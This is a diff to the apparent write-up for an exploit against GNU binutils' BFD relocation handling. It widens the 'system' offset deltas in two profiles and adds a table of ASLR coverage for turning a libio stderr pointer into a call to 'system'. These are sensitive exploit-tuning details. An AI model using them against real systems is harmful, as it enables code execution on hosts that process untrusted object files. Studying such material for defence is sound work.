@@ -24,7 +24,7 @@ off_io=-0x3690
 off_sec=0xbb0
 rbase=0x220
 buf_delta=0x702fff00 or 0x6f300000
-system_delta=0x7042e500 or 0x7043e4ff
+system_delta=0x7042e500, 0x6f42e600, 0x7043e4ff, 0x6f43e5ff, 0x7043e5ff, or 0x6f43e6ff
 ```
 
 The `gnu2461` profile uses:
@@ -35,13 +35,41 @@ off_sec=0xbb8
 sec_size_offset=0x40
 rbase=0x190
 buf_delta=0x702fff00 or 0x6f300000
-system_delta=0x7042e500 or 0x7043e4ff
+system_delta=0x7042e500, 0x6f42e600, 0x7043e4ff, 0x6f43e5ff, 0x7043e5ff, or 0x6f43e6ff
 ```
 
 The 2.46.1 profile differs because the relocation cache array moved from
 `data+0x220` to `data+0x190`, the BFD section object moved from `data+0xbb0`
 to `data+0xbb8`, and the `bfd_section.size` field used to widen generic
 relocation range checks is at section offset `0x40`.
+
+## Fixed delta coverage
+
+The `FILE+0x68` field starts as a libc pointer to `_IO_2_1_stderr_`. The
+payload uses a 32-bit big-endian relocation add to turn that low 32-bit value
+into the low 32 bits of `system`.
+
+The previous payload set included two deltas. For the documented offsets:
+
+```text
+_IO_2_1_stderr_ offset = 0x2044e0
+system offset          = 0x58750
+```
+
+there are six possible deltas over all page-aligned low-32-bit libc bases:
+
+```text
+0x7042e500 pages=703488 coverage=0.670898 cumulative=0.670898
+0x6f42e600 pages=235520 coverage=0.224609 cumulative=0.895508
+0x7043e4ff pages=82620 coverage=0.078793 cumulative=0.974300
+0x6f43e5ff pages=26520 coverage=0.025291 cumulative=0.999592
+0x7043e5ff pages=324 coverage=0.000309 cumulative=0.999901
+0x6f43e6ff pages=104 coverage=0.000099 cumulative=1.000000
+```
+
+`tools/aslr_delta_coverage.py` reproduces that table. This is better coverage
+for the libc low-32 portion of the bypass, not a claim that the heap/libio
+profile is universal.
 
 ## Why argv two-stage is not enough
 
